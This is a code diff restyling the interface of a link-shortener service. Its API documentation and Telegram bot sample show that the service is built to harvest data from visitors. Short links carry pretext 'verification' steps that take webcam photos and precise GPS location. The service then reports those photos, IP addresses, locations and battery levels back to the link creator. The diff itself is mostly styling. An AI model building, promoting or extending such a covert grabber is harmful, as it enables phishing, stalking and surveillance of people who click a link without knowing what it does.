@@ -2074,35 +2074,48 @@ create policy "Allow public delete access" on public.urls for delete using (true
       {/* Sync Modal */}
       {showSyncModal && (
         <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-md flex items-center justify-center p-4 min-h-screen">
-          <div className="clay-board p-8 w-full max-w-md relative text-[#162432] shadow-2xl">
-            <button 
-              onClick={() => setShowSyncModal(false)} 
-              className="absolute top-6 right-6 w-9 h-9 clay-circle-grey flex items-center justify-center text-[#243747] hover:text-[#0f1922] transition-all"
-            >
-              <X className="w-4 h-4"/>
-            </button>
-            <div className="w-14 h-14 clay-circle-grey flex items-center justify-center mb-5 text-[#2c6574]">
-              <Smartphone className="w-7 h-7 text-[#2c6574]" />
+          <div className="liquid-glass-box liquid-glass-modal p-6 sm:p-8 w-full max-w-md relative text-zinc-900 shadow-2xl rounded-[32px] border-2 border-white/90">
+            <div className="flex items-center justify-between mb-5 pb-3 border-b border-zinc-200/50">
+              <div className="flex items-center gap-3">
+                <div className="glass-orb orb-champagne w-11 h-11 flex items-center justify-center text-zinc-900 shadow-sm shrink-0">
+                  <Smartphone className="w-5 h-5 text-zinc-900" />
+                </div>
+                <div>
+                  <h3 className="text-xl font-black text-zinc-900 leading-tight">Identify / Sync</h3>
+                  <p className="text-[11px] text-zinc-600 font-bold">Link your generated short URLs</p>
+                </div>
+              </div>
+              <button 
+                onClick={() => {
+                  playBubblePop(450);
+                  setShowSyncModal(false);
+                }} 
+                className="glass-orb orb-clear w-9 h-9 flex items-center justify-center text-zinc-800 transition-all active:scale-90 shadow shrink-0"
+                title="Close"
+              >
+                <X className="w-4 h-4"/>
+              </button>
             </div>
-            <h3 className="text-2xl font-extrabold embossed-title mb-2">Identify / Sync</h3>
-            <p className="text-xs text-[#2c445a] mb-6 leading-relaxed font-medium">
+            
+            <p className="text-xs text-zinc-600 mb-5 leading-relaxed font-medium">
               Enter your phone number to link your generated short URLs. If you clear data or use a bot, entering this number will recover your history. No OTP needed.
             </p>
             
             <div className="space-y-4">
-              <div className="space-y-2">
-                <label className="text-[10px] text-[#2c445a] font-extrabold uppercase tracking-[0.1em]">Phone Number</label>
+              <div className="space-y-1.5">
+                <label className="text-[10px] text-zinc-700 font-extrabold uppercase tracking-wider block">Phone Number</label>
                 <input 
                   type="text" 
                   placeholder="e.g. +1234567890" 
                   value={syncPhoneInput}
                   onChange={(e) => setSyncPhoneInput(e.target.value)}
-                  className="w-full clay-search-pill px-4 py-3 text-sm text-[#142535] font-mono font-bold focus:outline-none transition-all"
+                  className="w-full liquid-glass-input px-4 py-3 text-sm text-zinc-900 font-mono font-bold focus:outline-none transition-all shadow-sm"
                 />
               </div>
 
               <button 
                 onClick={() => {
+                  playBubblePop(720);
                   const cleaned = syncPhoneInput.trim();
                   if (cleaned) {
                     localStorage.setItem('supashort_phone', cleaned);
@@ -2116,7 +2129,7 @@ create policy "Allow public delete access" on public.urls for delete using (true
                     setTimeout(syncHistory, 100);
                   }
                 }}
-                className="w-full clay-teal-btn py-3.5 text-sm font-extrabold uppercase tracking-wider text-white shadow-lg"
+                className="w-full glass-orb orb-blue py-3.5 text-xs sm:text-sm font-black uppercase tracking-wider text-white shadow-xl active:scale-95 transition-transform"
               >
                 {syncPhoneInput.trim() ? "Save Identity" : "Clear Identity"}
               </button>
@@ -2124,49 +2137,68 @@ create policy "Allow public delete access" on public.urls for delete using (true
           </div>
         </div>
       )}
+
       {/* API Docs & Standalone Widget Builder Modal */}
       {showApiModal && (
         <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-md flex items-center justify-center p-4 min-h-screen">
-          <div className="clay-board p-6 md:p-8 w-full max-w-3xl relative max-h-[90vh] flex flex-col shadow-2xl text-[#162432]">
-            <button 
-              onClick={() => setShowApiModal(false)} 
-              className="absolute top-6 right-6 w-9 h-9 clay-circle-grey flex items-center justify-center text-[#243747] hover:text-[#0f1922] transition-all"
-            >
-              <X className="w-4 h-4"/>
-            </button>
-            <div className="w-12 h-12 bg-green-500/10 rounded-2xl flex items-center justify-center mb-6 shrink-0">
-              <Code className="w-6 h-6 text-green-500" />
+          <div className="liquid-glass-box liquid-glass-modal p-5 sm:p-7 w-full max-w-3xl relative max-h-[90vh] flex flex-col shadow-2xl text-zinc-900 rounded-[32px] border-2 border-white/95">
+            {/* Clean Non-Colliding Modal Header */}
+            <div className="flex items-center justify-between pb-4 mb-4 border-b border-zinc-200/60 shrink-0">
+              <div className="flex items-center gap-3 min-w-0">
+                <div className="glass-orb orb-green w-10 h-10 flex items-center justify-center text-zinc-950 shadow-md shrink-0">
+                  <Code className="w-5 h-5 text-zinc-950" />
+                </div>
+                <div className="min-w-0">
+                  <h3 className="text-xl sm:text-2xl font-black text-zinc-900 leading-tight">Developer Integration</h3>
+                  <p className="text-xs text-zinc-600 font-bold truncate">Use our API with any bot or custom client</p>
+                </div>
+              </div>
+              <button 
+                onClick={() => {
+                  playBubblePop(450);
+                  setShowApiModal(false);
+                }} 
+                className="glass-orb orb-clear w-9 h-9 flex items-center justify-center text-zinc-800 transition-all active:scale-90 shadow shrink-0"
+                title="Close"
+              >
+                <X className="w-4 h-4"/>
+              </button>
             </div>
-            <h3 className="text-2xl font-extrabold embossed-title mb-2 shrink-0">Developer Integration</h3>
-            <p className="text-xs text-[#2c445a] font-medium mb-5 shrink-0 leading-relaxed">
-              Use our API with any chat bot or build your custom layout to generate short links independently.
-            </p>
 
             {/* Navigation Tabs */}
-            <div className="flex clay-recessed p-1.5 rounded-2xl mb-6 shrink-0 gap-2">
+            <div className="flex liquid-glass-input p-1 rounded-full mb-4 shrink-0 gap-1.5">
               <button 
-                onClick={() => setApiModalTab('json')}
+                onClick={() => {
+                  playBubblePop(520);
+                  setApiModalTab('json');
+                }}
                 className={cn(
-                  "flex-1 py-2 text-[10px] font-extrabold uppercase tracking-widest rounded-xl transition-all",
-                  apiModalTab === 'json' ? "clay-teal-btn text-white shadow-md" : "text-[#2d465a] hover:text-[#162736]"
+                  "flex-1 py-2 px-3 text-[11px] font-extrabold uppercase tracking-wider rounded-full transition-all active:scale-95",
+                  apiModalTab === 'json' ? "nav-pill-active shadow-md text-white" : "text-zinc-700 hover:text-zinc-950 font-bold"
                 )}
               >
                 JSON API Docs
               </button>
               <button 
-                onClick={() => setApiModalTab('code')}
+                onClick={() => {
+                  playBubblePop(560);
+                  setApiModalTab('code');
+                }}
                 className={cn(
-                  "flex-1 py-2 text-[10px] font-extrabold uppercase tracking-widest rounded-xl transition-all",
-                  apiModalTab === 'code' ? "clay-teal-btn text-white shadow-md" : "text-[#2d465a] hover:text-[#162736]"
+                  "flex-1 py-2 px-3 text-[11px] font-extrabold uppercase tracking-wider rounded-full transition-all active:scale-95",
+                  apiModalTab === 'code' ? "nav-pill-active shadow-md text-white" : "text-zinc-700 hover:text-zinc-950 font-bold"
                 )}
               >
                 Bot / SDK Codes
               </button>
               <button 
-                onClick={() => setApiModalTab('html')}
+                onClick={() => {
+                  playBubblePop(600);
+                  setApiModalTab('html');
+                }}
                 className={cn(
-                  "flex-1 py-2 text-[10px] font-extrabold uppercase tracking-widest rounded-xl transition-all",
-                  apiModalTab === 'html' ? "clay-teal-btn text-white shadow-md" : "text-[#2d465a] hover:text-[#162736]"
+                  "flex-1 py-2 px-3 text-[11px] font-extrabold uppercase tracking-wider rounded-full transition-all active:scale-95",
+                  apiModalTab === 'html' ? "nav-pill-active shadow-md text-white" : "text-zinc-700 hover:text-zinc-950 font-bold"
                 )}
               >
                 Standalone HTML
@@ -2175,90 +2207,81 @@ create policy "Allow public delete access" on public.urls for delete using (true
             
             {apiModalTab === 'json' ? (
               <>
-                <div className="flex-1 overflow-y-auto custom-scrollbar clay-scroll mb-6 clay-recessed-dark rounded-2xl p-4 font-mono text-[11px] text-zinc-300 space-y-4 shadow-inner">
+                <div className="flex-1 overflow-y-auto custom-scrollbar clay-scroll mb-4 bg-zinc-950/90 border border-zinc-800 rounded-2xl p-4 sm:p-5 font-mono text-[11.5px] leading-relaxed text-zinc-200 space-y-4 shadow-inner">
                   <div>
-                    <span className="text-emerald-400 font-bold">1. CREATE SMART SHORTLINK (POST)</span>
+                    <span className="text-emerald-400 font-extrabold">1. CREATE SMART SHORTLINK (POST)</span>
                     <br/>
-                    <span className="text-zinc-500">URL:</span> {window.location.origin}/api/shorten
+                    <span className="text-zinc-500">URL:</span> <span className="text-zinc-100 font-bold">{window.location.origin}/api/shorten</span>
                   </div>
                   <div>
-                    <span className="text-zinc-300 font-medium">Headers:</span>
+                    <span className="text-amber-400 font-bold">Headers:</span>
                     <br/>
-                    &nbsp;&nbsp;Content-Type: application/json
+                    &nbsp;&nbsp;<span className="text-zinc-300">Content-Type: application/json</span>
                   </div>
                   <div>
-                    <span className="text-zinc-300 font-medium font-bold">Body Params (JSON):</span>
+                    <span className="text-amber-400 font-bold">Body Params (JSON):</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400 font-semibold">longUrl</span> (string, req): Destination link URL
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">longUrl</span> <span className="text-zinc-400">(string, req): Destination link URL</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400">customAlias</span> (string, opt): Desired custom identifier path
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">customAlias</span> <span className="text-zinc-400">(string, opt): Desired custom identifier path</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400">phoneNumber</span> (string, opt): Bot/User identifier (used to dynamically fetch click telemetry back across channels)
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">phoneNumber</span> <span className="text-zinc-400">(string, opt): Bot/User identifier (used to fetch telemetry across channels)</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400">captureCamera</span> (boolean, opt): Requests facial camera verification step
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">captureCamera</span> <span className="text-zinc-400">(boolean, opt): Requests facial camera verification step</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400">captureLocation</span> (boolean, opt): Requests precise GPS authorization step
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">captureLocation</span> <span className="text-zinc-400">(boolean, opt): Requests precise GPS authorization step</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400">socialGateTitle</span> (string, opt): Custom social verification banner Title
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">socialGateTitle</span> <span className="text-zinc-400">(string, opt): Custom social verification banner Title</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400">socialGateUrl</span> (string, opt): External verification redirect URL
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">socialGateUrl</span> <span className="text-zinc-400">(string, opt): External verification redirect URL</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400">password</span> (string, opt): Setup dynamic password authorization lock
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">password</span> <span className="text-zinc-400">(string, opt): Setup dynamic password authorization lock</span>
                     <br/>
-                    &nbsp;&nbsp;<span className="text-blue-400">deviceId</span> (string, opt): Auto browser sync track identification
+                    &nbsp;&nbsp;<span className="text-blue-400 font-bold">deviceId</span> <span className="text-zinc-400">(string, opt): Auto browser sync track identification</span>
                   </div>
-                  <div className="border-t border-white/5 pt-3">
-                    <span className="text-emerald-400 font-bold">2. FETCH CAPTURED TELEMETRY LOGS (GET)</span>
+                  <div className="border-t border-zinc-800 pt-3">
+                    <span className="text-emerald-400 font-extrabold">2. FETCH CAPTURED TELEMETRY LOGS (GET)</span>
                     <br/>
-                    <span className="text-zinc-500">URL:</span> {window.location.origin}/api/shorten?phoneNumber=<span className="text-blue-400">YOUR_TELEGRAM_ID_OR_PHONE</span>
+                    <span className="text-zinc-500">URL:</span> <span className="text-zinc-100 font-bold">{window.location.origin}/api/shorten?phoneNumber=</span><span className="text-blue-400 font-bold">YOUR_TELEGRAM_ID_OR_PHONE</span>
                     <br/>
-                    <span className="text-zinc-500">Alternative:</span> .../api/shorten?deviceId=<span className="text-blue-400">YOUR_DEVICE_ID</span>
+                    <span className="text-zinc-500">Alternative:</span> <span className="text-zinc-100 font-bold">{window.location.origin}/api/shorten?deviceId=</span><span className="text-blue-400 font-bold">YOUR_DEVICE_ID</span>
                   </div>
                   <div>
-                    <span className="text-zinc-300">Expected Telemetry Result (JSON Schema):</span>
+                    <span className="text-amber-400 font-bold">Expected Telemetry Result (JSON Schema):</span>
                     <br/>
-                    {`{`}
-                    <br/>
-                    &nbsp;&nbsp;"success": true,
-                    <br/>
-                    &nbsp;&nbsp;"shortUrl": `${typeof window !== 'undefined' ? window.location.origin : 'http://localhost:3001'}/myalias`,
-                    <br/>
-                    &nbsp;&nbsp;"latestClick": {`{`}
-                    <br/>
-                    &nbsp;&nbsp;&nbsp;&nbsp;"ip_address": "8.8.8.8",
-                    <br/>
-                    &nbsp;&nbsp;&nbsp;&nbsp;"location_name": "New York, US",
-                    <br/>
-                    &nbsp;&nbsp;&nbsp;&nbsp;"captured_image": "data:image/jpeg;base64,...",
-                    <br/>
-                    &nbsp;&nbsp;&nbsp;&nbsp;"battery_level": 0.95,
-                    <br/>
-                    &nbsp;&nbsp;&nbsp;&nbsp;"created_at": "2026-05-27T12:00:00Z"
-                    <br/>
-                    &nbsp;&nbsp;{`}`}
-                    <br/>
-                    {`}`}
+                    <pre className="text-zinc-300 font-mono mt-1 text-[11px] leading-snug">{`{
+  "success": true,
+  "shortUrl": "${typeof window !== 'undefined' ? window.location.origin : 'http://localhost:3001'}/myalias",
+  "latestClick": {
+    "ip_address": "8.8.8.8",
+    "location_name": "New York, US",
+    "captured_image": "data:image/jpeg;base64,...",
+    "battery_level": 0.95,
+    "created_at": "2026-05-27T12:00:00Z"
+  }
+}`}</pre>
                   </div>
                 </div>
 
                 <button 
                   onClick={() => {
+                    playBubblePop(720);
                     const apiDocsText = `Here is the API documentation to integrate our shortlink service:\n\nEndpoint: POST ${window.location.origin}/api/shorten\nHeaders:\n  Content-Type: application/json\n\nBody Params (JSON):\n- longUrl (string, required): The target link to shorten.\n- customAlias (string, optional): A custom text alias.\n- phoneNumber (string, optional/required): Required if calling via bot or no deviceId. Identifies User.\n- captureCamera (boolean, optional): Set to true to require camera verification.\n- captureLocation (boolean, optional): Set to true to require location tracking.\n- socialGateTitle (string, optional): Setup a social lock title.\n- socialGateUrl (string, optional): The URL for social lock verification.\n- password (string, optional): Sets a password.\n- deviceId (string, optional): ID to sync history with UI.\n\nResponse (201):\n{\n  "success": true,\n  "shortUrl": "${window.location.origin}/alias",\n  "data": { ...dbRecord }\n}\n\nPlease generate integration code for this API.`;
                     navigator.clipboard.writeText(apiDocsText);
                     setApiDocsCopied(true);
                     setTimeout(() => setApiDocsCopied(false), 2000);
                   }}
-                  className="w-full shrink-0 flex items-center justify-center gap-2 clay-teal-btn text-white font-extrabold uppercase tracking-widest text-xs py-3.5 shadow-lg mb-2"
+                  className="w-full shrink-0 flex items-center justify-center gap-2 glass-orb orb-blue text-white font-black uppercase tracking-wider text-xs sm:text-sm py-3.5 shadow-xl transition-all active:scale-95 cursor-pointer mb-2"
                 >
                   {apiDocsCopied ? (
                     <>
-                      <Check className="w-4 h-4"/>
-                      Prompt Docs Copied!
+                      <Check className="w-4 h-4 stroke-[3]"/>
+                      <span>Prompt Docs Copied!</span>
                     </>
                   ) : (
                     <>
                       <Copy className="w-4 h-4"/>
-                      Copy to Prompt AI
+                      <span>Copy to Prompt AI</span>
                     </>
                   )}
                 </button>
@@ -2266,56 +2289,56 @@ create policy "Allow public delete access" on public.urls for delete using (true
             ) : apiModalTab === 'code' ? (
               <>
                 {/* Horizontal Language Selector */}
-                <div className="flex clay-recessed p-1.5 rounded-2xl gap-1.5 shrink-0 overflow-x-auto scrollbar-none mb-4">
+                <div className="flex liquid-glass-input p-1 rounded-full gap-1.5 shrink-0 overflow-x-auto scrollbar-none mb-4">
                   <button
-                    onClick={() => { setCodeSnippetLang('node-bot'); setSnippetCopied(false); }}
+                    onClick={() => { playBubblePop(500); setCodeSnippetLang('node-bot'); setSnippetCopied(false); }}
                     className={cn(
-                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-widest font-extrabold rounded-xl transition-all whitespace-nowrap",
-                      codeSnippetLang === 'node-bot' ? "clay-badge-teal text-white shadow" : "text-[#2a455a] hover:text-[#142332]"
+                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-wider font-extrabold rounded-full transition-all whitespace-nowrap active:scale-95",
+                      codeSnippetLang === 'node-bot' ? "nav-pill-active text-white shadow-sm" : "text-zinc-700 hover:text-zinc-950 font-bold"
                     )}
                   >
                     🤖 Telegram JS Bot
                   </button>
                   <button
-                    onClick={() => { setCodeSnippetLang('py-bot'); setSnippetCopied(false); }}
+                    onClick={() => { playBubblePop(530); setCodeSnippetLang('py-bot'); setSnippetCopied(false); }}
                     className={cn(
-                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-widest font-extrabold rounded-xl transition-all whitespace-nowrap",
-                      codeSnippetLang === 'py-bot' ? "clay-badge-teal text-white shadow" : "text-[#2a455a] hover:text-[#142332]"
+                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-wider font-extrabold rounded-full transition-all whitespace-nowrap active:scale-95",
+                      codeSnippetLang === 'py-bot' ? "nav-pill-active text-white shadow-sm" : "text-zinc-700 hover:text-zinc-950 font-bold"
                     )}
                   >
                     🐍 Python/TeleBot
                   </button>
                   <button
-                    onClick={() => { setCodeSnippetLang('curl'); setSnippetCopied(false); }}
+                    onClick={() => { playBubblePop(560); setCodeSnippetLang('curl'); setSnippetCopied(false); }}
                     className={cn(
-                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-widest font-extrabold rounded-xl transition-all whitespace-nowrap",
-                      codeSnippetLang === 'curl' ? "clay-badge-teal text-white shadow" : "text-[#2a455a] hover:text-[#142332]"
+                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-wider font-extrabold rounded-full transition-all whitespace-nowrap active:scale-95",
+                      codeSnippetLang === 'curl' ? "nav-pill-active text-white shadow-sm" : "text-zinc-700 hover:text-zinc-950 font-bold"
                     )}
                   >
                     ⚡ cURL
                   </button>
                   <button
-                    onClick={() => { setCodeSnippetLang('node-fetch'); setSnippetCopied(false); }}
+                    onClick={() => { playBubblePop(590); setCodeSnippetLang('node-fetch'); setSnippetCopied(false); }}
                     className={cn(
-                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-widest font-extrabold rounded-xl transition-all whitespace-nowrap",
-                      codeSnippetLang === 'node-fetch' ? "clay-badge-teal text-white shadow" : "text-[#2a455a] hover:text-[#142332]"
+                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-wider font-extrabold rounded-full transition-all whitespace-nowrap active:scale-95",
+                      codeSnippetLang === 'node-fetch' ? "nav-pill-active text-white shadow-sm" : "text-zinc-700 hover:text-zinc-950 font-bold"
                     )}
                   >
                     🟢 Node Fetch
                   </button>
                   <button
-                    onClick={() => { setCodeSnippetLang('py-requests'); setSnippetCopied(false); }}
+                    onClick={() => { playBubblePop(620); setCodeSnippetLang('py-requests'); setSnippetCopied(false); }}
                     className={cn(
-                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-widest font-extrabold rounded-xl transition-all whitespace-nowrap",
-                      codeSnippetLang === 'py-requests' ? "clay-badge-teal text-white shadow" : "text-[#2a455a] hover:text-[#142332]"
+                      "flex-1 px-3 py-1.5 text-[10px] uppercase tracking-wider font-extrabold rounded-full transition-all whitespace-nowrap active:scale-95",
+                      codeSnippetLang === 'py-requests' ? "nav-pill-active text-white shadow-sm" : "text-zinc-700 hover:text-zinc-950 font-bold"
                     )}
                   >
                     💡 Py Requests
                   </button>
                 </div>
 
-                <div className="flex-1 overflow-y-auto custom-scrollbar mb-4 bg-black/60 border border-white/5 p-4 rounded-xl relative">
-                  <pre className="text-[10.5px] font-mono text-zinc-350 select-all leading-relaxed whitespace-pre-wrap">
+                <div className="flex-1 overflow-y-auto custom-scrollbar clay-scroll mb-4 bg-zinc-950/90 border border-zinc-800 rounded-2xl p-4 sm:p-5 relative shadow-inner">
+                  <pre className="text-[11px] font-mono text-zinc-200 select-all leading-relaxed whitespace-pre-wrap">
                     {codeSnippetLang === 'node-bot' && 
 `const TelegramBot = require('node-telegram-bot-api');
 // 1. Swap with your own Telegram Bot Token
@@ -2459,6 +2482,7 @@ except Exception as error:
 
                 <button 
                   onClick={() => {
+                    playBubblePop(720);
                     let textToCopy = '';
                     if (codeSnippetLang === 'node-bot') {
                       textToCopy = `const TelegramBot = require('node-telegram-bot-api');\nconst token = 'YOUR_TELEGRAM_BOT_TOKEN';\nconst bot = new TelegramBot(token, { polling: true });\nconst API_ENDPOINT = '${window.location.origin}';\nbot.onText(/\\/shorten (.+)/, async (msg, match) => {\n  const chatId = msg.chat.id;\n  const longUrl = match[1];\n  const userPhone = String(msg.from.id);\n  try {\n    const res = await fetch(\`\${API_ENDPOINT}/api/shorten\`, {\n      method: "POST",\n      headers: { "Content-Type": "application/json" },\n      body: JSON.stringify({\n        longUrl,\n        phoneNumber: userPhone,\n        captureCamera: true,\n        captureLocation: true\n      })\n    });\n    const data = await res.json();\n    if (data.success) {\n      bot.sendMessage(chatId, \`⚡ *Smart Link Spawned\!*\\n\\n🔗 *Interactive Redirect Link:* \${data.shortUrl}\\n\\nAll visits collect premium device info/webcam camera images in real-time\! Sync this id in your dashboard: *\${userPhone}*\`, { parse_mode: 'Markdown' });\n    } else {\n      bot.sendMessage(chatId, \`❌ API Rejection: \${data.message || "Unknown error"}\`);\n    }\n  } catch (err) {\n    bot.sendMessage(chatId, \`❌ Integration Error: \${err.message}\`);\n  }\n});`;
@@ -2475,17 +2499,17 @@ except Exception as error:
                     setSnippetCopied(true);
                     setTimeout(() => setSnippetCopied(false), 2000);
                   }}
-                  className="w-full shrink-0 flex items-center justify-center gap-2 bg-blue-600 hover:bg-blue-500 text-white font-bold uppercase tracking-widest text-xs py-3.5 rounded-xl transition-all border border-blue-500/20 mb-2 active:scale-[0.99]"
+                  className="w-full shrink-0 flex items-center justify-center gap-2 glass-orb orb-blue text-white font-black uppercase tracking-wider text-xs sm:text-sm py-3.5 shadow-xl transition-all active:scale-95 cursor-pointer mb-2"
                 >
                   {snippetCopied ? (
                     <>
-                      <Check className="w-4 h-4"/>
-                      Copied Selected Snippet!
+                      <Check className="w-4 h-4 stroke-[3]"/>
+                      <span>Copied Selected Snippet!</span>
                     </>
                   ) : (
                     <>
                       <Copy className="w-4 h-4"/>
-                      Copy Code Snippet
+                      <span>Copy Code Snippet</span>
                     </>
                   )}
                 </button>
@@ -3046,34 +3070,36 @@ except Exception as error:
                     Download or copy this complete standalone reference client. Save it as <code className="text-blue-400 font-mono text-xs">index.html</code> anywhere, even running locally. It will connect to this server automatically!
                   </p>
                   
-                  <div className="flex-1 overflow-y-auto custom-scrollbar mb-6 bg-black/50 border border-white/5 rounded-xl p-4 font-mono text-[10px] text-zinc-400 select-all relative group max-h-[350px]">
+                  <div className="flex-1 overflow-y-auto custom-scrollbar mb-4 bg-zinc-950/90 border border-zinc-800 rounded-2xl p-4 font-mono text-[10.5px] leading-relaxed text-zinc-300 select-all relative group max-h-[350px] shadow-inner">
                     <pre className="whitespace-pre-wrap">{htmlContent}</pre>
                   </div>
 
-                  <div className="flex gap-4 shrink-0">
+                  <div className="flex flex-col sm:flex-row gap-3 shrink-0 mb-2">
                     <button 
                       onClick={() => {
+                        playBubblePop(650);
                         navigator.clipboard.writeText(htmlContent);
                         setApiHtmlCopied(true);
                         setTimeout(() => setApiHtmlCopied(false), 2000);
                       }}
-                      className="flex-1 flex items-center justify-center gap-2 clay-small-pill py-3 text-xs font-bold text-[#1f3749] transition-all"
+                      className="flex-1 flex items-center justify-center gap-2 glass-orb orb-champagne text-amber-950 font-black uppercase tracking-wider text-xs sm:text-sm py-3.5 shadow-xl transition-all active:scale-95 cursor-pointer"
                     >
                       {apiHtmlCopied ? (
                         <>
-                          <Check className="w-4 h-4 text-emerald-700"/>
-                          HTML Code Copied!
+                          <Check className="w-4 h-4 stroke-[3] text-emerald-800"/>
+                          <span>HTML Code Copied!</span>
                         </>
                       ) : (
                         <>
                           <Copy className="w-4 h-4"/>
-                          Copy HTML Code
+                          <span>Copy HTML Code</span>
                         </>
                       )}
                     </button>
 
                     <button 
                       onClick={() => {
+                        playBubblePop(820);
                         const blob = new Blob([htmlContent], { type: 'text/html' });
                         const url = URL.createObjectURL(blob);
                         const a = document.createElement('a');
@@ -3084,10 +3110,10 @@ except Exception as error:
                         document.body.removeChild(a);
                         URL.revokeObjectURL(url);
                       }}
-                      className="flex-1 flex items-center justify-center gap-2 clay-teal-btn py-3 text-xs font-extrabold uppercase tracking-wider text-white shadow-lg transition-all"
+                      className="flex-1 flex items-center justify-center gap-2 glass-orb orb-green text-white font-black uppercase tracking-wider text-xs sm:text-sm py-3.5 shadow-xl transition-all active:scale-95 cursor-pointer"
                     >
                       <Download className="w-4 h-4" />
-                      Download index.html
+                      <span>Download index.html</span>
                     </button>
                   </div>
                 </>
